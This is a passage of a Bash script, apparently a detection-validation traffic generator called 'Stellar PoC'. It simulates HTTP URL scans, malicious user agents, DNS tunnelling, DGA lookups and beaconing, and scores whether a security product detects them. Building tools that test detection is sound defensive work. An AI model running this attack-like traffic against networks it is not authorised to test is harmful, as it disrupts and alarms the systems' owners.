    FINAL_VAL_BEACON=$(lookup_stage_result_status "Beaconing")
    [[ "${FINAL_VAL_BEACON}" == unknown ]] && FINAL_VAL_BEACON=$(normalize_final_validation_status "${EXTERNAL_CALLBACK_STATUS:-skipped}")
    FINAL_VAL_EXTERNAL_CALLBACK=$(normalize_final_validation_status "${TELEMETRY_VAL_EXTERNAL_CALLBACK:-${EXTERNAL_CALLBACK_STATUS:-skipped}}")

    for _s in "${FINAL_VAL_HTTP_FOLLOWUP}" "${FINAL_VAL_SSH_FOLLOWUP}" "${FINAL_VAL_DNS_TUNNEL}" \
            "${FINAL_VAL_DGA}" "${FINAL_VAL_NEW_TLD}" "${FINAL_VAL_BEACON}" "${FINAL_VAL_EXTERNAL_CALLBACK}"; do
        [[ "${_s}" == skipped ]] && continue
        total_required=$((total_required + 1))
        if final_validation_counts_as_success "${_s}"; then
            success_count=$((success_count + 1))
        elif [[ "${_s}" == partial ]]; then
            partial_count=$((partial_count + 1))
        else
            failed_count=$((failed_count + 1))
        fi
    done

    poc_final_internal_consistency_check || true
    evidence_compute_overall_from_validated

    evidence_emit_final_validation_table
    state_append "final_validation.log" "overall=${OVERALL_RESULT} http=${FINAL_VAL_HTTP_FOLLOWUP} dga=${FINAL_VAL_DGA} ntld=${FINAL_VAL_NEW_TLD} dns=${FINAL_VAL_DNS_TUNNEL} env_blocked=${DNS_ENVIRONMENT_BLOCKED}"
    log_message "OK" "FINAL_VALIDATION OVERALL_RESULT=${OVERALL_RESULT} confidence=${DETECTION_CONFIDENCE_OVERALL}" >&2
    poc_emit_final_root_cause_summary
    poc_emit_all_module_diagnostics
    poc_emit_detection_readiness_report
    poc_emit_health_report
}

poc_detection_readiness_module_label() {
    case "${1,,}" in
        success|fallback_success|passed|pass|partial) printf 'PASS' ;;
        skipped) printf 'SKIP' ;;
        *) printf 'FAIL' ;;
    esac
}

poc_emit_detection_readiness_report() {
    local http ssh dns dga ntld callback overall score_block=""
    http=$(poc_detection_readiness_module_label "${FINAL_VAL_HTTP_FOLLOWUP:-skipped}")
    ssh=$(poc_detection_readiness_module_label "${FINAL_VAL_SSH_FOLLOWUP:-skipped}")
    dns=$(poc_detection_readiness_module_label "${FINAL_VAL_DNS_TUNNEL:-skipped}")
    dga=$(poc_detection_readiness_module_label "${FINAL_VAL_DGA:-skipped}")
    ntld=$(poc_detection_readiness_module_label "${FINAL_VAL_NEW_TLD:-skipped}")
    callback=$(poc_detection_readiness_module_label "${FINAL_VAL_EXTERNAL_CALLBACK:-skipped}")
    overall=$((DETECTION_SCORE_HTTP_URL_SCAN + DETECTION_SCORE_BEACON + DETECTION_SCORE_DGA + DETECTION_SCORE_DNS_TUNNEL))
    score_block="OVERALL_DETECTION_SCORE total=${overall} http=${DETECTION_SCORE_HTTP_URL_SCAN} beacon=${DETECTION_SCORE_BEACON} dga=${DETECTION_SCORE_DGA} dns=${DETECTION_SCORE_DNS_TUNNEL}"
    local block="=========================
DETECTION READINESS
=========================

HTTP URL Scan       ${http}
SSH Auth Burst      ${ssh}
DNS Tunnel          ${dns}
DGA                 ${dga}
DNS New TLD         ${ntld}
External Callback   ${callback}

${score_block}"
    log_message "OK" "${block}" >&2
    state_append "detection_readiness.log" "${block}"
}

log_http_url_scan_target_selection() {
    local candidate_count="$1" selected="$2" reason="$3"
    local probe_400="$4" probe_403="$5" probe_404="$6" probe_success="$7" probe_timeout="$8"
    local msg="HTTP_URL_SCAN_TARGET_SELECTION candidate_count=${candidate_count} selected=${selected} reason=${reason} probe_400=${probe_400} probe_403=${probe_403} probe_404=${probe_404} probe_success=${probe_success} probe_timeout=${probe_timeout}"
    state_append "http_url_scan_target_selection.log" "${msg}"
    log_message "OK" "${msg}" >&2
}

log_http_url_scan_auth_required_continue() {
    local target="$1" status="$2"
    local msg="HTTP_URL_SCAN_AUTH_REQUIRED_CONTINUE target=${target} status=${status} decision=continue_url_scan reason=auth_required_responses_are_valid_failed_url_telemetry"
    state_append "http_url_scan_auth_required.log" "${msg}"
    log_message "OK" "${msg}" >&2
}

compute_http_url_scan_detection_likelihood() {
    local total="$1" real_failed="$2" fail_ratio="$3"
    local http_400="$4" http_401="$5" http_403="$6" http_404="$7" http_405="$8" http_500="$9" timeout="${10}"
    local real_fail_codes=0
    total=$(safe_int "${total}")
    real_failed=$(safe_int "${real_failed}")
    fail_ratio=$(safe_int "${fail_ratio}")
    http_400=$(safe_int "${http_400}")
    http_401=$(safe_int "${http_401}")
    http_403=$(safe_int "${http_403}")
    http_404=$(safe_int "${http_404}")
    http_405=$(safe_int "${http_405}")
    http_500=$(safe_int "${http_500}")
    timeout=$(safe_int "${timeout}")
    real_fail_codes=$((http_400 + http_401 + http_403 + http_404 + http_405 + http_500 + timeout))
    if (( total >= 40 && real_failed >= 32 && fail_ratio >= 80 && real_fail_codes >= 32 )); then
        HTTP_URL_SCAN_DETECTION_LIKELIHOOD="high"
        HTTP_URL_SCAN_FINAL_REASON="concentrated burst met high threshold (total>=40 real_failed>=32 fail_ratio>=80% status_failures>=32)"
        return 0
    fi
    if (( total >= 30 && real_failed >= 20 && fail_ratio >= 60 )); then
        HTTP_URL_SCAN_DETECTION_LIKELIHOOD="medium"
        HTTP_URL_SCAN_FINAL_REASON="concentrated burst met medium threshold (total>=30 real_failed>=20 fail_ratio>=60%)"
        return 0
    fi
    HTTP_URL_SCAN_DETECTION_LIKELIHOOD="low"
    HTTP_URL_SCAN_FINAL_REASON="concentrated burst below medium threshold (total=${total} real_failed=${real_failed} fail_ratio=${fail_ratio}%)"
}

http_url_scan_curl_exit_to_root_cause() {
    case "$(safe_int "${1}")" in
        6) printf 'dns_failure' ;;
        7) printf 'connection_refused' ;;
        28) printf 'timeout' ;;
        35) printf 'tls_failure' ;;
        56) printf 'reset_by_peer' ;;
        *) printf '' ;;
    esac
}

http_url_scan_track_curl_exit_code() {
    local ec="$1"
    ec=$(safe_int "${ec}")
    case "${ec}" in
        6) HTTP_URL_SCAN_CURL_EC_6=$((HTTP_URL_SCAN_CURL_EC_6 + 1)) ;;
        7) HTTP_URL_SCAN_CURL_EC_7=$((HTTP_URL_SCAN_CURL_EC_7 + 1)) ;;
        28) HTTP_URL_SCAN_CURL_EC_28=$((HTTP_URL_SCAN_CURL_EC_28 + 1)) ;;
        35) HTTP_URL_SCAN_CURL_EC_35=$((HTTP_URL_SCAN_CURL_EC_35 + 1)) ;;
        56) HTTP_URL_SCAN_CURL_EC_56=$((HTTP_URL_SCAN_CURL_EC_56 + 1)) ;;
        0) ;;
        *) HTTP_URL_SCAN_CURL_EC_OTHER=$((HTTP_URL_SCAN_CURL_EC_OTHER + 1)) ;;
    esac
}

http_url_scan_classify_root_cause_from_exit_counts() {
    local best_ec="" best_count=-1 ec count
    for ec in 6 7 28 35 56; do
        case "${ec}" in
            6) count=$(safe_int "${HTTP_URL_SCAN_CURL_EC_6:-0}") ;;
            7) count=$(safe_int "${HTTP_URL_SCAN_CURL_EC_7:-0}") ;;
            28) count=$(safe_int "${HTTP_URL_SCAN_CURL_EC_28:-0}") ;;
            35) count=$(safe_int "${HTTP_URL_SCAN_CURL_EC_35:-0}") ;;
            56) count=$(safe_int "${HTTP_URL_SCAN_CURL_EC_56:-0}") ;;
        esac
        if (( count > best_count )); then
            best_count="${count}"
            best_ec="${ec}"
        fi
    done
    if (( best_count > 0 )); then
        http_url_scan_curl_exit_to_root_cause "${best_ec}"
        return 0
    fi
    printf ''
}

http_url_scan_classify_root_cause() {
    local responses="$1" connected="$2" timeouts="$3" attempted="$4"
    local curl_err="${5:-0}" tls_fail="${6:-0}" rc="" exit_rc=""
    responses=$(safe_int "${responses}")
    connected=$(safe_int "${connected}")
    timeouts=$(safe_int "${timeouts}")
    attempted=$(safe_int "${attempted}")
    curl_err=$(safe_int "${curl_err}")
    tls_fail=$(safe_int "${tls_fail}")
    exit_rc=$(http_url_scan_classify_root_cause_from_exit_counts)
    if [[ -n "${exit_rc}" ]]; then
        printf '%s' "${exit_rc}"
        return 0
    fi
    if (( attempted < 1 )); then
        printf 'unknown'
        return 0
    fi
    rc=$(http_url_scan_curl_exit_to_root_cause 35)
    if (( tls_fail > 0 )) && [[ -n "${rc}" ]]; then
        printf '%s' "${rc}"
        return 0
    fi
    rc=$(http_url_scan_curl_exit_to_root_cause 28)
    if (( timeouts > 0 )) && [[ -n "${rc}" ]]; then
        printf '%s' "${rc}"
        return 0
    fi
    rc=$(http_url_scan_curl_exit_to_root_cause 7)
    if (( connected == 0 && responses == 0 )) && [[ -n "${rc}" ]]; then
        printf '%s' "${rc}"
        return 0
    fi
    rc=$(http_url_scan_curl_exit_to_root_cause 56)
    if (( responses == 0 && connected > 0 )) && [[ -n "${rc}" ]]; then
        printf '%s' "${rc}"
        return 0
    fi
    rc=$(http_url_scan_curl_exit_to_root_cause 6)
    if (( curl_err > 0 )) && [[ -n "${rc}" ]]; then
        printf '%s' "${rc}"
        return 0
    fi
    if (( responses == 0 )); then
        printf 'network_unreachable'
        return 0
    fi
    printf 'unknown'
}

log_http_url_scan_diagnostic_summary() {
    local attempted="$1" connected="$2" responses="$3" http200="$4" http4xx="$5" http5xx="$6" root_cause="$7"
    attempted=$(safe_int "${attempted}")
    connected=$(safe_int "${connected}")
    responses=$(safe_int "${responses}")
    http200=$(safe_int "${http200}")
    http4xx=$(safe_int "${http4xx}")
    http5xx=$(safe_int "${http5xx}")
    HTTP_URL_SCAN_SUMMARY_CONNECTED="${connected}"
    HTTP_URL_SCAN_SUMMARY_RESPONSES="${responses}"
    HTTP_URL_SCAN_HTTP200="${http200}"
    HTTP_URL_SCAN_HTTP4XX="${http4xx}"
    HTTP_URL_SCAN_HTTP5XX="${http5xx}"
    HTTP_URL_SCAN_ROOT_CAUSE="${root_cause}"
    local msg="HTTP_URL_SCAN_SUMMARY attempted=${attempted} connected=${connected} responses=${responses} http200=${http200} http4xx=${http4xx} http5xx=${http5xx} root_cause=${root_cause}"
    state_append "http_url_scan_final_summary.log" "${msg}"
    log_message "OK" "${msg}" >&2
}

log_http_url_scan_final_summary() {
    local selected_target="$1" total="$2" success="$3" real_failed="$4" synthetic_failed="$5"
    local redirect_count="$6" http_400="$7" http_401="$8" http_403="$9" http_404="${10}" http_405="${11}" http_500="${12}" timeout="${13}"
    local fail_ratio=0 core_http=0 logic_err="" msg=""
    http_refresh_sot_from_events || true
    if (( $(safe_int "${HTTP_URL_ATTEMPT_COUNT:-0}") > 0 )); then
        total=$(safe_int "${HTTP_URL_ATTEMPT_COUNT}")
        real_failed=$(safe_int "${HTTP_URL_SCAN_REAL_FAILED:-${real_failed}}")
        timeout=$(safe_int "${HTTP_URL_SCAN_TIMEOUT_COUNT:-${timeout}}")
        success=$(safe_int "${HTTP_URL_COMPLETE_COUNT:-${success}}")
    fi
    total=$(safe_int "${total}")
    success=$(safe_int "${success}")
    real_failed=$(safe_int "${real_failed}")
    synthetic_failed=$(safe_int "${synthetic_failed}")
    redirect_count=$(safe_int "${redirect_count}")
    http_400=$(safe_int "${http_400}")
    http_401=$(safe_int "${http_401}")
    http_403=$(safe_int "${http_403}")
    http_404=$(safe_int "${http_404}")
    http_405=$(safe_int "${http_405}")
    http_500=$(safe_int "${http_500}")
    timeout=$(safe_int "${timeout}")
    (( total > 0 )) && fail_ratio=$((real_failed * 100 / total))
    core_http=$((http_400 + http_403 + http_404 + http_500))
    if (( core_http == 0 && (real_failed + synthetic_failed) >= 32 )); then
        logic_err="HTTP_URL_SCAN_LOGIC_ERROR selected_target=${selected_target} total_requests=${total} aggregate_failed=$((real_failed + synthetic_failed)) http_400=${http_400} http_403=${http_403} http_404=${http_404} http_500=${http_500} detail=synthetic_or_legacy_failed_without_status_counters"
        state_append "http_url_scan_final_summary.log" "${logic_err}"
        log_message "ERROR" "${logic_err}" >&2
        HTTP_URL_SCAN_DETECTION_LIKELIHOOD="low"
        HTTP_URL_SCAN_FINAL_REASON="logic_error aggregate_failures_without_http_status_counters"
    else
        compute_http_url_scan_detection_likelihood "${total}" "${real_failed}" "${fail_ratio}" \
            "${http_400}" "${http_401}" "${http_403}" "${http_404}" "${http_405}" "${http_500}" "${timeout}"
    fi
    HTTP_URL_SCAN_REAL_FAILED="${real_failed}"
    HTTP_URL_SCAN_SYNTHETIC_FAILED="${synthetic_failed}"
    HTTP_URL_SCAN_REDIRECT_COUNT="${redirect_count}"
    HTTP_URL_SCAN_TIMEOUT_COUNT="${timeout}"
    HTTP_URL_SCAN_HTTP_500="${http_500}"
    DETECTION_LIKELIHOOD_URL_SCAN="${HTTP_URL_SCAN_DETECTION_LIKELIHOOD:-low}"
    HTTP_URL_SCAN_SUMMARY_TOTAL="${total}"
    HTTP_REQUESTS_ATTEMPTED="${total}"
    msg="HTTP_URL_SCAN_FINAL_SUMMARY selected_target=${selected_target} total_requests=${total} success=${success} real_failed=${real_failed} synthetic_failed=${synthetic_failed} redirect_count=${redirect_count} http_400=${http_400} http_401=${http_401} http_403=${http_403} http_404=${http_404} http_405=${http_405} http_500=${http_500} timeout=${timeout} fail_ratio=${fail_ratio} detection_likelihood=${HTTP_URL_SCAN_DETECTION_LIKELIHOOD} detection_likelihood_url_scan=${DETECTION_LIKELIHOOD_URL_SCAN} detection_likelihood_malicious_ua=${DETECTION_LIKELIHOOD_MALICIOUS_UA:-low} reason=${HTTP_URL_SCAN_FINAL_REASON}"
    state_append "http_url_scan_final_summary.log" "${msg}"
    log_message "OK" "${msg}" >&2
    local http200=$((success)) http4xx=$((http_400 + http_401 + http_403 + http_404 + http_405)) http5xx="${http_500}"
    local responses=$((http200 + http4xx + http5xx + redirect_count))
    local connected="${HTTP_CONNECTED:-${responses}}"
    local root_cause=""
    if (( responses < 1 )); then
        root_cause=$(http_url_scan_classify_root_cause "${responses}" "${connected}" "${timeout}" "${total}" \
            "${HTTP_URL_SCAN_CURL_EC_OTHER:-0}" "${HTTP_URL_SCAN_CURL_EC_35:-0}")
    else
        root_cause=none
    fi
    log_http_url_scan_diagnostic_summary "${total}" "${connected}" "${responses}" "${http200}" "${http4xx}" "${http5xx}" "${root_cause}"
}

log_detection_window_plan() {
    local module="$1" target="$2" window_seconds="$3" required_events="$4" planned_events="$5" reason="$6"
    local msg="DETECTION_WINDOW_PLAN module=${module} target=${target} window_seconds=${window_seconds} required_events=${required_events} planned_events=${planned_events} reason=${reason}"
    state_append "detection_window.log" "${msg}"
    log_message "OK" "${msg}" >&2
}

log_detection_window_progress() {
    local module="$1" target="$2" elapsed_seconds="$3" events_sent="$4" required_events="$5" condition_met="$6"
    local msg="DETECTION_WINDOW_PROGRESS module=${module} target=${target} elapsed_seconds=${elapsed_seconds} events_sent=${events_sent} required_events=${required_events} condition_met=${condition_met}"
    state_append "detection_window.log" "${msg}"
    log_message "OK" "${msg}" >&2
}

log_detection_window_summary() {
    local module="$1" target="$2" elapsed_seconds="$3" actual_events="$4" required_events="$5"
    local condition_met="$6" detection_likelihood="$7" reason="$8"
    local msg="DETECTION_WINDOW_SUMMARY module=${module} target=${target} elapsed_seconds=${elapsed_seconds} actual_events=${actual_events} required_events=${required_events} condition_met=${condition_met} detection_likelihood=${detection_likelihood} reason=${reason}"
    state_append "detection_window.log" "${msg}"
    log_message "OK" "${msg}" >&2
}

ingest_detection_window_progress_from_output() {
    local out="$1" module="$2" target="$3" required_events="$4"
    local line elapsed events met
    while IFS= read -r line; do
        [[ "${line}" != DETECTION_WINDOW_PROGRESS* ]] && continue
        elapsed=$(safe_int "$(sed -n 's/.*elapsed_seconds=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        events=$(safe_int "$(sed -n 's/.*events_sent=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        met=$(sed -n 's/.*condition_met=\([^ ]*\).*/\1/p' <<< "${line}")
        [[ -z "${met}" ]] && met=no
        log_detection_window_progress "${module}" "${target}" "${elapsed}" "${events}" "${required_events}" "${met}"
    done <<< "$(printf '%s\n' "${out}" | tr -d '\r' | grep '^DETECTION_WINDOW_PROGRESS' || true)"
}

resolve_http_detection_window_plan() {
    case "${POC_INTENSITY}" in
        light) HTTP_SCAN_WINDOW_SECONDS=30 ;;
        high|spike) HTTP_SCAN_WINDOW_SECONDS=20 ;;
        *) HTTP_SCAN_WINDOW_SECONDS=25 ;;
    esac
    HTTP_SCAN_WAVE_SLEEP=0
    HTTP_SCAN_WAVES=1
    HTTP_SCAN_INTER_REQUEST_SLEEP=0
    HTTP_SCAN_WAVE_ATTEMPT_CAP=15
    HTTP_SCAN_RECON_MIN_FAILED=0
}

resolve_dns_detection_window_plan() {
    local planned="${1:-${DNS_BURST_COUNT:-${DNS_TUNNEL_QUERY_COUNT}}}"
    planned=$(safe_int "${planned}")
    (( planned < DNS_TUNNEL_MIN_QUERIES )) && planned="${DNS_TUNNEL_MIN_QUERIES}"
    (( planned > DNS_TUNNEL_MAX_QUERIES )) && planned="${DNS_TUNNEL_MAX_QUERIES}"
    DETECTION_WINDOW_DNS_QUERIES="${planned}"
    DETECTION_WINDOW_DNS_WINDOW_SECONDS=90
    (( DETECTION_WINDOW_DNS_WINDOW_SECONDS < 60 )) && DETECTION_WINDOW_DNS_WINDOW_SECONDS=60
    (( DETECTION_WINDOW_DNS_WINDOW_SECONDS > 120 )) && DETECTION_WINDOW_DNS_WINDOW_SECONDS=120
    # Pace queries to finish inside the 1-2 minute detection window (single resolver burst).
    DNS_TUNNEL_SLEEP_MS=$((DETECTION_WINDOW_DNS_WINDOW_SECONDS * 1000 / planned / 3))
    DNS_TUNNEL_JITTER_MS=$((DNS_TUNNEL_SLEEP_MS / 2))
    (( DNS_TUNNEL_SLEEP_MS < 20 )) && DNS_TUNNEL_SLEEP_MS=20
    (( DNS_TUNNEL_JITTER_MS < 10 )) && DNS_TUNNEL_JITTER_MS=10
    printf '%s' "${planned}"
}

resolve_dga_detection_window_plan() {
    local nx="${1:-${DGA_NXDOMAIN_QUERIES}}"
    nx=$(safe_int "${nx}")
    (( nx < 500 )) && nx=500
    (( nx > 500 )) && nx=500
    DGA_NXDOMAIN_QUERIES="${nx}"
    DGA_MODEL_NX_COUNT="${nx}"
    (( DETECTION_WINDOW_DGA_NXDOMAIN < 300 )) && DETECTION_WINDOW_DGA_NXDOMAIN=300
    DETECTION_WINDOW_DGA_WINDOW_SECONDS=120
    printf '%s' "${nx}"
}

resolve_dga_resolvable_query_plan() {
    local n="${1:-${DGA_RESOLVABLE_QUERIES}}"
    n=$(safe_int "${n}")
    (( n < 30 )) && n=30
    (( n > 30 )) && n=30
    DGA_RESOLVABLE_QUERIES="${n}"
    DGA_MODEL_RESOLVABLE_COUNT="${n}"
    printf '%s' "${n}"
}


http_url_scan_window_condition_met() {
    local unique_attempted="$1" real_failed="$2" required_unique="$3" required_failed="$4"
    unique_attempted=$(safe_int "${unique_attempted}")
    real_failed=$(safe_int "${real_failed}")
    required_unique=$(safe_int "${required_unique}")
    required_failed=$(safe_int "${required_failed}")
    (( unique_attempted >= required_unique && real_failed >= required_failed )) && return 0
    return 1
}

malicious_ua_window_condition_met() {
    local ua_total="$1" ua_abnormal="$2"
    ua_total=$(safe_int "${ua_total}")
    ua_abnormal=$(safe_int "${ua_abnormal}")
    (( ua_total >= 40 && ua_abnormal >= 40 )) && return 0
    return 1
}

dns_tunnel_window_condition_met() {
    local attempted="$1" required="$2"
    attempted=$(safe_int "${attempted}")
    required=$(safe_int "${required}")
    (( attempted >= required )) && return 0
    return 1
}

dga_window_condition_met() {
    local nx="$1" resolved="$2" required_nx="$3" likelihood="${4:-${DGA_DETECTION_LIKELIHOOD:-LOW}}"
    local sent random_domains
    nx=$(safe_int "${nx}")
    resolved=$(safe_int "${resolved}")
    required_nx=$(safe_int "${required_nx}")
    sent=$(safe_int "${DGA_QUERY_SENT_COUNT:-0}")
    random_domains=$(safe_int "${DGA_ACTUAL_RANDOM_DOMAINS:-0}")
    (( required_nx < 150 )) && required_nx="${DETECTION_WINDOW_DGA_NXDOMAIN:-150}"
    likelihood="${likelihood^^}"
    (( nx >= required_nx && sent >= 150 && random_domains >= 150 )) && [[ "${likelihood}" == HIGH ]] && return 0
    return 1
}


log_http_detection_window_bundle() {
    local target="$1" elapsed="$2" phase="${3:-summary}"
    local required_unique=40 required_failed="${HTTP_SCAN_WINDOW_MIN_FAILED}"
    local ua_met=no url_met=no ua_likelihood="${DETECTION_LIKELIHOOD_MALICIOUS_UA:-low}"
    local url_likelihood="${DETECTION_LIKELIHOOD_URL_SCAN:-low}"
    local real_failed="${HTTP_URL_SCAN_REAL_FAILED:-0}"
    local reason=""
    if http_url_scan_window_condition_met "${URL_SCAN_UNIQUE_ATTEMPTED:-0}" "${real_failed}" \
        "${required_unique}" "${required_failed}"; then
        url_met=yes
    fi
    if malicious_ua_window_condition_met "${HTTP_UA_COVERAGE_TOTAL:-0}" "${HTTP_UA_COVERAGE_ABNORMAL:-0}"; then
        ua_met=yes
    fi
    case "${phase}" in
        plan)
            log_detection_window_plan "HTTP_URL_Scan" "${target}" "${HTTP_SCAN_WINDOW_SECONDS}" \
                "unique_urls>=${required_unique},4xx_failures>=${required_failed}" \
                "${HTTP_SCAN_UNIQUE_URL_TARGET}" \
                "single_target_concentrated_burst_stellar_${DETECTION_WINDOW_BUCKET_SECONDS}s_bucket"
            log_detection_window_plan "Malicious_User-Agent" "${target}" "${HTTP_SCAN_WINDOW_SECONDS}" \
                "malicious_ua_requests>=40" "${HTTP_SCAN_UNIQUE_URL_TARGET}" \
                "combined_with_url_scan_same_target_no_normal_ua"
            log_detection_window_progress "HTTP_URL_Scan" "${target}" "0" "0" \
                "unique_urls>=${required_unique},4xx_failures>=${required_failed}" "no"
            log_detection_window_progress "Malicious_User-Agent" "${target}" "0" "0" "malicious_ua_requests>=40" "no"
            ;;
        summary)
            reason="${HTTP_URL_SCAN_FINAL_REASON:-burst_complete}"
            local detection_events
            detection_events=$(($(http_url_scan_sum_success_status_codes) + $(http_url_scan_sum_failed_status_codes)))
            if (( detection_events < 1 )); then
                detection_events=$(http_url_scan_telemetry_responses)
            fi
            if (( detection_events < 1 && $(safe_int "${HTTP_REQUESTS_ATTEMPTED:-0}") > 0 )); then
                detection_events=$(safe_int "${HTTP_REQUESTS_ATTEMPTED:-0}")
            fi
            log_detection_window_progress "HTTP_URL_Scan" "${target}" "${elapsed}" \
                "${detection_events}" "unique_urls>=${required_unique},4xx_failures>=${required_failed}" "${url_met}"
            log_detection_window_summary "HTTP_URL_Scan" "${target}" "${elapsed}" \
                "${detection_events}" "unique_urls>=${required_unique},4xx_failures>=${required_failed}" \
                "${url_met}" "${url_likelihood}" "${reason}"
            reason="malicious_ua_coverage abnormal=${HTTP_UA_COVERAGE_ABNORMAL:-0} total=${HTTP_UA_COVERAGE_TOTAL:-0}"
            log_detection_window_progress "Malicious_User-Agent" "${target}" "${elapsed}" \
                "${HTTP_UA_COVERAGE_TOTAL:-0}" "malicious_ua_requests>=40" "${ua_met}"
            log_detection_window_summary "Malicious_User-Agent" "${target}" "${elapsed}" \
                "${HTTP_UA_COVERAGE_ABNORMAL:-0}" "malicious_ua_requests>=40" \
                "${ua_met}" "${ua_likelihood}" "${reason}"
            ;;
    esac
}

poc_artifact_append() {
    local path="$1" line="$2"
    [[ -n "${path}" && -n "${line}" ]] || return 0
    printf '%s\n' "${line}" >> "${path}" 2>/dev/null || true
}

poc_obs_append_log() {
    poc_artifact_append "${POC_EXECUTION_LOG}" "$1"
    [[ -n "${POC_CUSTOMER_LOG}" ]] && poc_artifact_append "${POC_CUSTOMER_LOG}" "$1"
}

poc_obs_log() {
    local level="$1" msg="$2" plain prefix ts
    case "${level}" in
        DEBUG)
            [[ "${DEBUG:-false}" == true || "${POC_OBS_DEBUG}" == true ]] || return 0
            ;;
    esac
    ts=$(date +"%Y-%m-%d %H:%M:%S")
    plain="[${ts}] [${level}] ${msg}"
    poc_artifact_append "${POC_EXECUTION_LOG}" "${plain}"
    prefix=$(log_console_prefix)
    case "${level}" in
        ERROR) echo -e "${prefix}${RED}[-] ${plain}${NC}" >&2 ;;
        WARN)  echo -e "${prefix}${YELLOW}[!] ${plain}${NC}" >&2 ;;
        DECISION) echo -e "${prefix}${CYAN}${plain}${NC}" >&2 ;;
        EVIDENCE|SUMMARY) echo -e "${prefix}${GREEN}${plain}${NC}" >&2 ;;
        DEBUG) echo "${prefix}${plain}" >&2 ;;
        *)     echo "${prefix}${plain}" >&2 ;;
    esac
}

poc_obs_report_append() {
    poc_artifact_append "${POC_REPORT_CWD}" "$1"
}

poc_obs_report_init_header() {
    local src_ip user host start_ts
    [[ "${POC_REPORT_HEADER_WRITTEN}" == true ]] && return 0
    [[ -n "${POC_REPORT_CWD}" ]] || return 0
    src_ip=$(poc_obs_get_source_ip)
    user=$(id -un 2>/dev/null || printf '%s' "${USER:-unknown}")
    host=$(hostname -f 2>/dev/null || hostname 2>/dev/null || printf 'unknown')
    start_ts=$(date +"%Y-%m-%d %H:%M:%S")
    : > "${POC_REPORT_CWD}" 2>/dev/null || true
    {
        echo "# Stellar PoC Report"
        echo ""
        echo "| Field | Value |"
        echo "|---|---|"
        echo "| Run ID | ${POC_RUN_ID} |"
        echo "| Host | ${host} |"
        echo "| User | ${user} |"
        echo "| Source IP | ${src_ip} |"
        echo "| Script version | ${STELLAR_POC_VERSION:-unknown} |"
        echo "| Target range | ${TARGET_NET:-n/a} |"
        echo "| Start time | ${start_ts} |"
        echo "| Log file | \`${POC_EXECUTION_LOG}\` |"
        echo ""
        echo "## Execution timeline"
        echo ""
        echo "Stages and major events in chronological order."
        echo ""
        echo "| Time | Stage | MITRE | Telemetry | Target | Status | Detail |"
        echo "|---|---|---|---|---|---|---|"
    } >> "${POC_REPORT_CWD}" 2>/dev/null || true
    POC_REPORT_HEADER_WRITTEN=true
}

poc_obs_report_stage_event() {
    local ts="$1" stage="$2" mitre="$3" telemetry="$4" target="$5" status="$6" ctx="$7"
    [[ -n "${POC_REPORT_CWD}" ]] || return 0
    poc_obs_report_init_header
    ctx="${ctx//$'\n'/ }"
    ctx="${ctx//|/\\|}"
    poc_obs_report_append "| ${ts} | ${stage} | ${mitre} | ${telemetry} | ${target} | ${status} | ${ctx} |"
}

poc_obs_report_ensure_discovery_section() {
    [[ "${POC_REPORT_DISCOVERY_HEADER}" == true ]] && return 0
    poc_obs_report_append ""
    poc_obs_report_append "## Discovery (hosts and services)"
    poc_obs_report_append ""
    poc_obs_report_append "| Time | Host | Port | Proto | Service | State | Reason |"
    poc_obs_report_append "|---|---|---|---|---|---|---|"
    POC_REPORT_DISCOVERY_HEADER=true
}

poc_obs_report_discovery_row() {
    local ip="$1" port="$2" proto="$3" state="$4" reason="$5" service="$6"
    local ts
    ts=$(date +"%Y-%m-%d %H:%M:%S")
    poc_obs_report_ensure_discovery_section
    poc_obs_report_append "| ${ts} | ${ip} | ${port} | ${proto} | ${service} | ${state} | ${reason} |"
}

poc_obs_report_ensure_followup_section() {
    [[ "${POC_REPORT_FOLLOWUP_HEADER}" == true ]] && return 0
    poc_obs_report_append ""
    poc_obs_report_append "## Follow-up results"
    poc_obs_report_append ""
    poc_obs_report_append "| Time | Scenario | Target | Service | Classification | Decision | Skip reason | Detail |"
    poc_obs_report_append "|---|---|---|---|---|---|---|---|"
    POC_REPORT_FOLLOWUP_HEADER=true
}

poc_obs_init_artifacts() {
    local cwd ts
    [[ "${POC_OBS_INITIALIZED}" == true ]] && return 0
    cwd="$(pwd)"
    ts=$(date +%Y%m%d_%H%M%S)
    POC_RUN_ID="${POC_RUN_ID:-${ts}}"
    POC_EXECUTION_LOG="${cwd}/stellar_poc_${POC_RUN_ID}.log"
    POC_REPORT_CWD="${cwd}/stellar_poc_${POC_RUN_ID}_report.md"
    POC_CUSTOMER_LOG="${cwd}/poc.log"
    POC_CUSTOMER_REPORT="${cwd}/poc_report.txt"
    POC_CUSTOMER_VALIDATION="${cwd}/poc_validation.txt"
    POC_EVIDENCE_DIR="${cwd}/stellar_poc_${POC_RUN_ID}_evidence"
    mkdir -p "${POC_EVIDENCE_DIR}" 2>/dev/null || true
    : > "${POC_EXECUTION_LOG}" 2>/dev/null || true
    : > "${POC_CUSTOMER_LOG}" 2>/dev/null || true
    : > "${POC_CUSTOMER_REPORT}" 2>/dev/null || true
    : > "${POC_CUSTOMER_VALIDATION}" 2>/dev/null || true
    LOG_FILE="${POC_EXECUTION_LOG}"
    REPORT_MD="${POC_REPORT_CWD}"
    TIMELINE_LOG="${POC_EXECUTION_LOG}"
    POC_OBS_INITIALIZED=true
    [[ "${DEBUG:-false}" == true ]] && POC_OBS_DEBUG=true
    if declare -F init_event_store >/dev/null 2>&1; then
        init_event_store
    fi
    poc_obs_report_init_header
}

poc_obs_get_source_ip() {
    local ip=""
    if command -v ip >/dev/null 2>&1; then
        ip=$(ip -4 route get 1.1.1.1 2>/dev/null | awk '/src/ {print $7; exit}')
    fi
    [[ -z "${ip}" && -n "${ATTACKER_IP}" ]] && ip="${ATTACKER_IP}"
    printf '%s' "${ip:-unknown}"
}

poc_obs_print_run_header() {
    local src_ip user host start_ts
    poc_obs_init_artifacts
    src_ip=$(poc_obs_get_source_ip)
    user=$(id -un 2>/dev/null || printf '%s' "${USER:-unknown}")
    host=$(hostname -f 2>/dev/null || hostname 2>/dev/null || printf 'unknown')
    start_ts=$(date +"%Y-%m-%d %H:%M:%S")
    poc_obs_append_log "============================================================"
    poc_obs_append_log "POC TRAFFIC GENERATOR"
    poc_obs_append_log "============================================================"
    poc_obs_append_log ""
    poc_obs_append_log "Run ID: ${POC_RUN_ID}"
    poc_obs_append_log "Host: ${host}"
    poc_obs_append_log "User: ${user}"
    poc_obs_append_log "Source IP: ${src_ip}"
    poc_obs_append_log "Script Version: ${STELLAR_POC_VERSION}"
